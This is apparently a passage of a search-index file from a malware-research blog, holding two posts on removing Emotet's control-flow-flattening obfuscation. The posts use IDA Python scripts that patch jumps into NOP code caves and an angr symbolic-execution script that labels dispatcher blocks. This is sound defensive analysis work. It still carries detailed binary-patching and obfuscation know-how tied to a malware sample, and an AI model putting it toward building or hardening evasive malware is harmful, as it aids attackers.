{&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} ============== {0: {&#39;entry&#39;: 268470148, &#39;exit&#39;: 268473318, &#39;next_states&#39;: [{&#39;state_value&#39;: 161707569, &#39;condition&#39;: None}]}, 161707569: {&#39;entry&#39;: 268474817, &#39;exit&#39;: 268474817, &#39;next_states&#39;: [{&#39;state_value&#39;: 66940794, &#39;condition&#39;: None}]}, 66940794: {&#39;entry&#39;: 268474131, &#39;exit&#39;: 268474309, &#39;next_states&#39;: [{&#39;state_value&#39;: 227043414, &#39;condition&#39;: None}, {&#39;state_value&#39;: 148128813, &#39;condition&#39;: &#39;jz&#39;}]}, 227043414: {&#39;entry&#39;: 268474834, &#39;exit&#39;: 268474587, &#39;next_states&#39;: []}, 148128813: {&#39;entry&#39;: 268473769, &#39;exit&#39;: 268474098, &#39;next_states&#39;: [{&#39;state_value&#39;: 64685583, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 64685583: {&#39;entry&#39;: 268474317, &#39;exit&#39;: 268474459, &#39;next_states&#39;: [{&#39;state_value&#39;: 151019129, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 240590470: {&#39;entry&#39;: 268474540, &#39;exit&#39;: 268474584, &#39;next_states&#39;: []}, 151019129: {&#39;entry&#39;: 268473723, &#39;exit&#39;: 268473749, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 180166165, &#39;condition&#39;: None}]}, 180166165: {&#39;entry&#39;: 268474600, &#39;exit&#39;: 268474810, &#39;next_states&#39;: [{&#39;state_value&#39;: 156164867, &#39;condition&#39;: None}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}]}, 156164867: {&#39;entry&#39;: 268474467, &#39;exit&#39;: 268474506, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}} . Patching Ideas . Assumptions: . There is enough code cave space (dispatcher code) that we can implement our jump table | Any short jumps from an obb remain in the state (no patch needed) or jump to a code cave | ** Note we may need to first process states that have an exit_bb that doesn&#39;t have a jmp as the final instruction so we can check for code caves at the next address . ** We might want to proactivly patch out all cf blocks with nops to make the process easier to identify unused caves . For each state in the state map. . if there is only one next-state lookup next-state entry_bb if it immediate follows state exit_bb do nothing | if it does not immediatly follow check if state exit_bb has a jmp as the final instruction if it does then simply alter the address to point to the next-state entry_bb | if it doesn&#39;t then find the next available code cave - if it doesn&#39;t immediatly follow the bb we are f-ed!! | . | . | if there is more than one next-state again check for a jmp as the final state instruction or a code cave following the bb if there is enough space to add a conditional jmp and an unconditiona jmp add them in directly | if not then add ajmp to a larger code cave | . | . import idaapi import idautils import idc import struct # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 # Map of all the bb and their type (obb / cf) # bb_state_map[addr] = {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548} bb_state_map = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} # Map of the states their entry and exit and the next states # state_table[&#39;state_value&#39;] = { # &#39;entry&#39;: None # &#39;exit&#39;: None # &#39;next_states&#39;: [ {&#39;state_value&#39;:None, &#39;condition&#39;: None }, ] state_table = {0: {&#39;entry&#39;: 268470148, &#39;exit&#39;: 268473318, &#39;next_states&#39;: [{&#39;state_value&#39;: 161707569, &#39;condition&#39;: None}]}, 161707569: {&#39;entry&#39;: 268474817, &#39;exit&#39;: 268474817, &#39;next_states&#39;: [{&#39;state_value&#39;: 66940794, &#39;condition&#39;: None}]}, 66940794: {&#39;entry&#39;: 268474131, &#39;exit&#39;: 268474309, &#39;next_states&#39;: [{&#39;state_value&#39;: 227043414, &#39;condition&#39;: None}, {&#39;state_value&#39;: 148128813, &#39;condition&#39;: &#39;jz&#39;}]}, 227043414: {&#39;entry&#39;: 268474834, &#39;exit&#39;: 268474587, &#39;next_states&#39;: []}, 148128813: {&#39;entry&#39;: 268473769, &#39;exit&#39;: 268474098, &#39;next_states&#39;: [{&#39;state_value&#39;: 64685583, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 64685583: {&#39;entry&#39;: 268474317, &#39;exit&#39;: 268474459, &#39;next_states&#39;: [{&#39;state_value&#39;: 151019129, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}, 240590470: {&#39;entry&#39;: 268474540, &#39;exit&#39;: 268474584, &#39;next_states&#39;: []}, 151019129: {&#39;entry&#39;: 268473723, &#39;exit&#39;: 268473749, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}, {&#39;state_value&#39;: 180166165, &#39;condition&#39;: None}]}, 180166165: {&#39;entry&#39;: 268474600, &#39;exit&#39;: 268474810, &#39;next_states&#39;: [{&#39;state_value&#39;: 156164867, &#39;condition&#39;: None}, {&#39;state_value&#39;: 240590470, &#39;condition&#39;: &#39;jz&#39;}]}, 156164867: {&#39;entry&#39;: 268474467, &#39;exit&#39;: 268474506, &#39;next_states&#39;: [{&#39;state_value&#39;: 240590470, &#39;condition&#39;: None}]}} # Track states that have been patched patched_states = [] # Nop all of the cf blocks - create our code caves for bb_addr in bb_state_map: if not bb_state_map[bb_addr][&#39;is_obb&#39;]: # Patch it idaapi.patch_bytes(bb_addr, b&#39; x90&#39;*(bb_state_map[bb_addr][&#39;end&#39;] - bb_addr)) # TODO: when we patch we should check to make sure there are enough nops to actually patch # Find all state exit bb that don&#39;t end with a patchable (jmp) instruction and add control flow in the following code cave # - if there is no following code cave !!! ERROR we can&#39;t proceed this is not patchable in-place for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue #print(f&quot;STATE: {hex(state_value)}&quot;) exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] #print(f&quot;entry_bb_start: {hex(entry_bb_start)}&quot;) #print(f&quot;exit_bb_start: {hex(exit_bb_start)}&quot;) # Check the final instruction of the exit bb exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) exit_bb_final_mnemonic = print_insn_mnem(exit_bb_end_head) ## Assume you can&#39;t have conditional jumps from the state into the dispatcher if exit_bb_final_mnemonic != &#39;jmp&#39; and &#39;ret&#39; not in exit_bb_final_mnemonic : # Check if there is only one next state and it is contiguous next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 0: # This is an end block who cares print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - No need to patch this it&#39;s an end block&quot;) patched_states.append(state_value) continue elif len(next_states) == 1: # Check if the state is contiguous next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] if next_state_entry == exit_bb_end: print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - No need to patch this it&#39;s contiguous&quot;) patched_states.append(state_value) continue # If we are here we need a code cave following our bb # Check is there space for a code cave if print_insn_mnem(exit_bb_end) == &#39;nop&#39;: print(f&quot;This bb needs to eat the code cave!!! - {hex(exit_bb_end_head)}&quot;) patched_states.append(state_value) # Directly add the jmps if len(next_states) == 1: # Directly patch one jmp patch_address = exit_bb_end next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] # Set up the patch jumps # TODO: For now we will hard code the codition as a jz patch_jmp_cond_start = exit_bb_end jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(exit_bb_end, patch_bytes) else: # NO? Abort! This won&#39;t work # If this is the case then it doesn&#39;t need to be patched # Else check for code cave print(f&quot;ABORT!! STATE: {hex(state_value)} Entry: {hex(entry_bb_start)}&quot;) abort_flag = False # Find all state exit bb that end with a short jmp - these need to be patched first they depend on the code cave proximity for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue if abort_flag: break if state_value in patched_states: continue exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] # Check the final instruction of the exit bb exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) exit_bb_final_mnemonic = print_insn_mnem(exit_bb_end_head) ## Assume you can&#39;t have conditional jumps from the state into the dispatcher if exit_bb_final_mnemonic == &#39;jmp&#39;: # Check the number of bytes next_instruction_ea = next_head(exit_bb_end_head) instruction_count = next_instruction_ea - exit_bb_end_head if instruction_count &lt; 5: # This is a short jump # Follow the jump this will be our patch area short_jmp_address = get_operand_value(exit_bb_end_head,0) # Check if this a single jump to another state so we don&#39;t need to patch next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 1: # Check if the state is at the jump address next_state_address = state_table[next_states[0][&#39;state_value&#39;]][&#39;entry&#39;] if next_state_address == short_jmp_address: print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump to next state no patch&quot;) patched_states.append(state_value) continue # If we got here we need to add a patch # Check if this address is available as a code cave if not adjust it patched_states.append(state_value) ptr_short_jmp_address = short_jmp_address while print_insn_mnem(ptr_short_jmp_address) != &#39;nop&#39;: # We need to adjust the jmp to the nearest code cave # Loop until we hit the next section of nops ptr_short_jmp_address = next_head(ptr_short_jmp_address) # Error if we run out of space in the function if ptr_short_jmp_address &gt;= fn_end: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - short jmp nop finder hit end of function with no suitable code cave found!&quot;) abort_flag = True break # Check to see if we need to update the jmp diplacement if ptr_short_jmp_address != short_jmp_address: original_displacement = struct.unpack(&#39;b&#39;,get_bytes(exit_bb_end_head + 1, 1))[0] original_displacement += ptr_short_jmp_address - short_jmp_address try: idaapi.patch_bytes(exit_bb_end_head + 1, struct.pack(&#39;b&#39;,original_displacement)) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump updated jump to code cave: {hex(ptr_short_jmp_address)}&quot;) except: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - short jmp code cave adjustment is too far!&quot;) abort_flag = True break # If we get here we can assume we are ready to patch at the ptr_short_jmp_address if len(next_states) == 1: # Directly patch one jmp patch_address = ptr_short_jmp_address next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump patched with one state at {hex(patch_address)}&quot;) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] # Set up the patch jumps # TODO: For now we will hard code the codition as a jz patch_jmp_cond_start = ptr_short_jmp_address jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(ptr_short_jmp_address, patch_bytes) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - Short jump patched with one two states at {hex(ptr_short_jmp_address)}&quot;) # Patch all remaining state exits for state_value in state_table: if len(state_table[state_value][&#39;next_states&#39;]) == 0: # This is an end state skip it continue if abort_flag: break if state_value in patched_states: continue exit_bb_start = state_table[state_value][&#39;exit&#39;] entry_bb_start = state_table[state_value][&#39;entry&#39;] # Get address of final instruction exit_bb_end = bb_state_map[exit_bb_start][&#39;end&#39;] exit_bb_end_head = prev_head(exit_bb_end) next_states = state_table[state_value][&#39;next_states&#39;] if len(next_states) == 1: # Directly patch one jmp patch_address = exit_bb_end_head next_state_value = next_states[0][&#39;state_value&#39;] next_state_entry = state_table[next_state_value][&#39;entry&#39;] jmp_rel = next_state_entry - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - patched with one state at {hex(patch_address)}&quot;) else: # Find the condition and patch first then patch other jmp_condition = None conditional_address = None unconditional_address = None for next_state in next_states: if next_state[&#39;condition&#39;] is None: unconditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] else: conditional_address = state_table[next_state[&#39;state_value&#39;]][&#39;entry&#39;] jmp_condition = next_state[&#39;condition&#39;] if unconditional_address is None or conditional_address is None: print(f&quot;conditions error!! {next_states}&quot;) abort_flag = True # Set up the patch jumps # TODO: For now we will hard code the codition as a jz # Find a code cave to insert our jumps - search from the fn start to end code_cave_ptr = fn_start while code_cave_ptr &lt;= fn_end: # Find a code cave with enough nops if print_insn_mnem(code_cave_ptr) == &#39;nop&#39;: if get_bytes(code_cave_ptr, 11) == b&#39; x90&#39;*11: break # Find next head code_cave_ptr = next_head(code_cave_ptr) # Check to make sure we didn&#39;t run out of room in the function if code_cave_ptr &gt;= fn_end: print(f&quot;ABORT - STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - no code cave found!&quot;) abort_flag = True break # Patch the jump to point to our new code cave patch_address = exit_bb_end_head new_jmp_address = code_cave_ptr jmp_rel = new_jmp_address - (patch_address + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) idaapi.patch_bytes(patch_address, patch_jmp) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - moved our jump to point to a code cave: {hex(code_cave_ptr)}&quot;) patch_jmp_cond_start = code_cave_ptr jmp_rel_statisfied = conditional_address - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = unconditional_address - (patch_jmp_start + 5) patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) patch_bytes = patch_jmp_condition + patch_jmp idaapi.patch_bytes(code_cave_ptr, patch_bytes) print(f&quot;STATE: {hex(state_value)} Entry: {hex(entry_bb_start)} - patched multiple states at code cave: {hex(code_cave_ptr)}&quot;) . Failures and Next Steps . We made a bad assumption when we derived conditional next states. Our assumption was that we could rely on the FLAGS that were used to set the state to still be intact by the time the state exited so all we would need to do is add a conditional jmp based on the FLAGS. This turned out to not be the case for all states so our conditional jumps were incorrectly influenced by other code in the state. . Hack #1 . One hack that we tried was to iterate through all insructions in the state and whenever the STATE register was invovled we replaced the instruction with an instruction to save the FLAGS in the STATE register. The assumption was that the last move into the STATE register would be the conditional one since it would overwrite the unconditional STATE. . 9c -&gt; push flags 5b -&gt; pop ebx (store FLAGS in state register) . Then before we added our conditional jump we moved the flags back into the FLAGS register. The idea was that now our conditional jump would be based on the same FLAGS that were used to set the STATE earlier in the state basedic blocks. . 53 -&gt; push ebx (state register withe stored FLAGS) 9d -&gt; pop flags . This does work except IDA is unable to simplify this logic so the end result is some random looking conditions that the analyst must investigate manually to recover the control flow. Not good! . .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/emotet/2022/04/20/emotet_deobfuscation_generic.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/emotet/2022/04/20/emotet_deobfuscation_generic.html",
            "date": " • Apr 20, 2022"
        }
        
    
  
    
        ,"post13": {
            "title": "Symbolic Execution For Deobfuscation The Basics",
            "content": "Overview . DFS and BFS graph traversal tutorial | OST2 - Reverse Engineering 3201: Symbolic Analysis | Deobfuscation: recovering an OLLVM-protected program (QuarksLab) | Automated Detection of Control-flow Flattening (Tim Blazytko) | Hex-Rays Microcode API vs. Obfuscating Compiler | What is SSA Static Single Assigment | Assembly Instructions Data Sheet | IDA IR Explorer (Lucid) | Dissecting LLVM Obfuscator Part 1 | Stack-based graph traversal ≠ depth first search | . Control Flow Flattening Obfuscation . Non-Obfuscated Control Flow . Obfuscated Control Flow (Flattened) . Symbolic Execution . A few concepts we need to understand first. . Static single assignment form | Symbolic execution | Z3 Theorem Prover | . Symbolic Execution With SSA IR . Labelling The Dispatcher . start at the entry of the fn and assume this is an obb and has a STATE (in some cases the STATE is passed as an argument so this is a bad assumption) | use symbolic execution to get the next bb if the next bb constraints depend on our STATE register this is a dispatcher (cf) bb, label this bb (entry to dispatcher) | if the next bb constaints are equal to a STATE register this next bb is an obb, label the next bb (exit from dispatcher) | if there is no branch (no constraints) keep the previous label, label this bb | . | if there are no next bb this is an END bb | . The example we will be using is an obfuscated Emotet binary eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) BINARY_PATH = &#39;/tmp/emotet.bin&#39; # Save some info about each bb # bb_states[bb_address] = {&quot;is_obb&quot;:true/false, &quot;end&quot;:&lt;end of bb&gt;} bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Setup simulation manager simgr = project.factory.simgr(initial_state) # We are going to start with an assumption that the first BB is in an obb # Since we are using a queue we need to track this rolling state along with the address of the bb # bb_info = {address:&lt;&gt;, prev_is_obb:true/false} # Use a queue for BFS q = Queue() # Push function start onto queue # Set the sim manager for the next state to remove any concrete value first_state = project.factory.blank_state(addr=fn_start) first_state.options.add(angr.options.CALLLESS) bb_info = {&#39;address&#39;:fn_start, &#39;prev_is_obb&#39;:True, &#39;state&#39;:first_state} q.put(bb_info) ## TODO: currently we don&#39;t handle when the first bb in a transition from a cf to obb doesn&#39;t set the STATE, # our algorithm will think this is just another cf bb # Walk the queue while not q.empty(): bb_info = q.get() bb_address = bb_info.get(&#39;address&#39;) prev_bb_is_obb = bb_info.get(&#39;prev_is_obb&#39;) new_state = bb_info.get(&#39;state&#39;) bb_end_address = new_state.block().size + new_state.block().addr print(f&quot;BB: {hex(bb_address)}&quot;) #print(project.factory.block(simgr.active[0].addr).pp()) print(f&quot;BB end:{hex(bb_end_address)}&quot;) ## Check if bb is already labeled in bb_states if it is just generate and push # the next states don&#39;t relabel it if bb_address not in bb_states: if prev_bb_is_obb: # Reset the state for any transition from an obb new_state = project.factory.blank_state(addr=bb_address) new_state.options.add(angr.options.CALLLESS) # Use successors to determine info about this block if len(list(project.factory.successors(new_state))) == 0: # If there are no successors this is an end bb so it must be an obb bb_states[bb_address] = {&#39;is_obb&#39;:True, &#39;end&#39;:bb_end_address} print(f&quot;This is an end block&quot;) elif len(list(project.factory.successors(new_state))) == 1: # If there is only next bb then there is no condition print(f&quot;Only one successor: {hex(project.factory.successors(new_state)[0].addr)}&quot;) if prev_bb_is_obb: # If we are in an obb keep the obb label bb_states[bb_address] = {&#39;is_obb&#39;:True, &#39;end&#39;:bb_end_address} print(f&quot;Previous bb was obb this one is too&quot;) else: bb_states[bb_address] = {&#39;is_obb&#39;:False, &#39;end&#39;:bb_end_address} print(f&quot;Previous bb was cf this one is too&quot;) else: # If there are multiple next bb then there is a condition # Determin if the branch depends on state print(f&quot;Multiple successors&quot;) print(f&quot; t{hex(project.factory.successors(new_state)[0].addr)}&quot;) print(f&quot; t{hex(project.factory.successors(new_state)[1].addr)}&quot;) flag_depends_on_state = False for next_bb in project.factory.successors(new_state): print(f&quot;Constraints {hex(next_bb.addr)}:&quot;) for constraint in next_bb.solver.constraints: print(f&quot; t{constraint}&quot;) for v in constraint.variables: if &#39;reg_&#39;+ state_register in v: flag_depends_on_state = True print(f&quot; t t Depends on STATE&quot;) # If the constraint is an == this means next_bb must be an obb # Preemptively add it to the bb_states if constraint.op == &#39;__eq__&#39;: print(f&quot; t t **Equals STATE next bb must be obb&quot;) next_bb_addr = next_bb.addr next_bb_end = next_bb_addr + next_bb.block().size # make sure not to re-label stuff this is sort of like an alread seen list too if next_bb_addr not in bb_states: print(f&quot; t t ++ adding obb label&quot;) bb_states[next_bb_addr] = {&#39;is_obb&#39;:True, &#39;end&#39;:next_bb_end} else: print(f&quot; t t !! bb already labeled !!&quot;) # If the branch depends on state then this is a cf block if flag_depends_on_state: bb_states[bb_address] = {&#39;is_obb&#39;:False, &#39;end&#39;:bb_end_address} prev_bb_is_obb = False print(f&quot;Control flow depends on STATE - must be cf&quot;) else: # use previous state bb_states[bb_address] = {&#39;is_obb&#39;:prev_bb_is_obb, &#39;end&#39;:bb_end_address} print(f&quot;Control does not depend on STATE - keep previouse state {prev_bb_is_obb}&quot;) else: print(f&quot;Already labeled bb - skipping!&quot;) # Set the next prev state based on the saved one if bb_states[bb_address].get(&#39;is_obb&#39;): prev_bb_is_obb = True else: prev_bb_is_obb = False # new_state = project.factory.blank_state(addr=bb_address) # new_state.options.add(angr.options.CALLLESS) # Mark this bb as visited bb_visited.add(bb_address) # Use successors to push next bb on queue for next_bb in project.factory.successors(new_state): next_address = next_bb.addr if next_address not in bb_visited: if next_bb.regs.get(state_register).uninitialized: bb_info = {&#39;address&#39;:next_address, 